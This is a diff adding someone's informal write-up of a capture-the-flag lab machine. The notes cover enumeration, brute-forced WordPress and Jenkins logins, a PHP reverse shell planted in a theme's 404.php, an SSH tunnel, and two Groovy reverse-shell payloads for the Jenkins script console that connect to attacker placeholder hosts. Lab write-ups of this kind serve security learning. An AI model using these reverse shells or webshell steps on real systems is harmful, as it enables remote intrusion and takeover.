@@ -1,0 +1,85 @@
+LOOK THROUGH ALL DIRECTORIES ON THE SYSTEM, LOOK FOR UNUSAL .TXT FILES-L 
+
+THIS REVEALS PLAINTEXT PASSWORDS !!! 
+
+enumeration shows ports 22 and 88 open, running nmap with scripts doesnt show anything interesting, running gobuster /blog, /phpmyadmin, /wordpress, /server-status 
+
+of interest were /blog and /wordpress which seemed to be showing the same stuff 
+
+nikto showed combination of nmap and gobuster output 
+
+a point of interest was admin login pane in wordpress which I was able to bruteforce with creds being **admin:my2guys** 
+
+in the wordpress admin private post we could find creds:
+
+**william:arnold147**
+
+which turned out to not be of any use 
+
+the goal for exploiting the admin panel was a reverse shell, which I was able to get editing one of the templates in a way where I deleted all the data and pasted in a php-reverse-shell available in KALI resources 
+
+shell:
+
+edit theme twentytwenty, 404.php 
+
+delete all, copy and paste php-rev-shell 
+
+remember about addy and port tv
+
+exec at 
+
+ip/wordpress/wp-content/themes/twentytwenty/404.php
+
+remember about listener
+
+this got us a shell as www-data in a docker env, looking at /etc/passwd revealed user aubreanna
+
+after enumerating directories we could find credentials to:
+
+/etc/phpmyadmin - **phpmyadmin:B2Ud4fE0ZmVq**
+
+/var/www/html/ - some config file - **wordpress:wordpress123** -phpmyadmin
+
+/opt/wp-save.txt - aubreanna:<password>
+
+phpmyadmin didn’t show anything interesting, but credentials to account aubreanna allowed us to ssh into the system, which revealed user flag and a note saying that theres jenkins software running on port 8080, so in order to be able to access the site I used a ssh tunnel, tunneling the traffic into my kali using this command:
+
+`ssh -L 4444:172.17.0.2:8080 [aubreanna@10.10.252.171](mailto:aubreanna@10.10.252.171)`
+
+-L - tunneling trafic (reverse would be -R)
+
+4444 - port on local machine to tunnel traffic t o
+
+172.17.0.2 - IP on target machine on which jenkins site was running
+
+8080 - port on which jenkins was running on target machine
+
+aubreanna@10.10.252.171 - in order for this to work we needed to provide credentials and IP of the machine 
+
+after executing this command, upon wisiting [localhost:444](http://localhost:444)4 on my local web browser a jenkins site revealed itself 
+
+bruteforcing the login pane showed credentials to be:
+
+**admin:spongebob**
+
+jenkins allows us several ways to execute command on the target system, this time I used 
+
+manage jenkins > script console 
+
+`r = Runtime.getRuntime()`
+
+`p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/LOCALIP/LOCALPORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])`
+
+`p.waitFor()`
+
+what also worked was 
+
+`String host=”ATTACKERIP”;`
+
+`int port=ATTACKERPORT;`
+
+`String cmd=”/bin/sh”; #You can replace this with cmd.exe for Windows`
+
+`Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`
+
+the shell that i received was root, which allowed me to grab root flag and complete the challenge
